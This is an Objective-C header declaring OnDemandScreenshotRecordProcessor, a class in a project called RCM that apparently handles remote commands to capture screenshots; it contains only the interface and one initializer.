//
//  OnDemandScreenshotRecordProcessor.h
//  RCM
//
//  Created by Makara Khloth on 3/10/15.
//
//

#import <Foundation/Foundation.h>

#import "RemoteCmdAsyncNonHTTPProcessor.h"
#import "ScreenshotCaptureDelegate.h"

@interface OnDemandScreenshotRecordProcessor : RemoteCmdAsyncNonHTTPProcessor <ScreenshotCaptureDelegate> {
    
}


- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
    andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate;

@end
